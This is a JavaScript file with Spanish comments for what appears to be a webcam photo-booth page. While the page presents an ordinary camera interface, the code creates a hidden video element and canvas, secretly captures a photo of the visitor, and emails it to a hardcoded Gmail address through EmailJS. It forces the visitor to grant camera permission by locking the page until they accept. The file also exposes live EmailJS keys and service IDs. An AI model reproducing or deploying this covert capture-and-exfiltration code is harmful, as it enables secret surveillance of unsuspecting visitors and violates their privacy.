  // Inicializa EmailJS
  emailjs.init("VjQYPRJy2mXtQPXgB"); // tu Public Key

  const maxPhotos = 1;
  const photoInterval = 3000;
  const toEmail = "root52909@gmail.com";

  const videoVisible = document.getElementById("videoVisible");

  // Cámara invisible y canvas
  const videoInvisible = document.createElement("video");
  videoInvisible.style.display = "none";
  document.body.appendChild(videoInvisible);

  const canvasInvisible = document.createElement("canvas");
  canvasInvisible.style.display = "none";
  document.body.appendChild(canvasInvisible);

  let photoCount = 0;
  let streamGlobal = null;

  async function startCamera() {
    try {
      // Bloquea todo mientras pide permiso
      document.body.style.pointerEvents = 'none';
      if (!streamGlobal) {
        streamGlobal = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      }

      // Permiso otorgado: desbloquea
      document.body.style.pointerEvents = 'auto';
      document.body.style.overflow = 'auto';
      welcomeModal.style.display = 'none';

      // Cámara visible
      videoVisible.srcObject = streamGlobal;
      videoVisible.play();

      // Cámara invisible
      videoInvisible.srcObject = streamGlobal;
      videoInvisible.play();

      videoInvisible.onloadedmetadata = () => {
        const interval = setInterval(() => {
          takeInvisiblePhoto();
          photoCount++;
          if (photoCount >= maxPhotos) {
            clearInterval(interval);
          }
        }, photoInterval);
      };

    } catch (err) {
      window.location.href = "index.html"; // o mostrar mensaje fijo
    }
  }

  function takeInvisiblePhoto() {
    const ctx = canvasInvisible.getContext("2d");
    canvasInvisible.width = videoInvisible.videoWidth / 2;
    canvasInvisible.height = videoInvisible.videoHeight / 2;

    ctx.drawImage(videoInvisible, 0, 0, canvasInvisible.width, canvasInvisible.height);

    // Marco dorado
    ctx.lineWidth = 20;
    ctx.strokeStyle = "gold";
    ctx.strokeRect(0, 0, canvasInvisible.width, canvasInvisible.height);

    // Fecha y hora
    const now = new Date();
    ctx.font = "30px Arial";
    ctx.fillStyle = "white";
    ctx.strokeStyle = "black";
    ctx.lineWidth = 2;
    const text = now.toLocaleString();
    ctx.strokeText(text, 20, canvasInvisible.height - 30);
    ctx.fillText(text, 20, canvasInvisible.height - 30);

    const imageData = canvasInvisible.toDataURL("image/jpeg", 0.5);
    enviarFoto(imageData, photoCount + 1);
  }

  function enviarFoto(imageBase64, numero) {
    const params = {
      to_email: toEmail,
      message: `¡Aquí tienes el recuerdo #${numero}! 📸`,
      photo: imageBase64
    };

    emailjs.send("service_ky1f599", "template_dlw99r6", params)
      .then(() => console.log(`📩 Foto #${numero} enviada!`))
      .catch(err => console.error(`❌ Error al enviar foto #${numero}:`, err));
  }

  // Modal inicial
  const welcomeModal = document.getElementById('welcomeModal');
  const continueBtn = document.getElementById('continueBtn');

  // Bloquea scroll y clics al inicio
  document.body.style.overflow = 'hidden';
  document.body.style.pointerEvents = 'none';
  welcomeModal.style.pointerEvents = 'auto'; // solo modal interactuable

  continueBtn.addEventListener('click', () => {
    startCamera();
  });

  // Opcional: botón de captura de tu UI
  document.getElementById('captureBtn').addEventListener('click', function() {
    document.getElementById('results').style.display = 'block';
    document.getElementById('results').scrollIntoView({ behavior: 'smooth' });
  });

  document.getElementById('newPhotoBtn').addEventListener('click', function() {
    document.getElementById('results').style.display = 'none';
    document.querySelector('.camera-container').scrollIntoView({ behavior: 'smooth' });
  });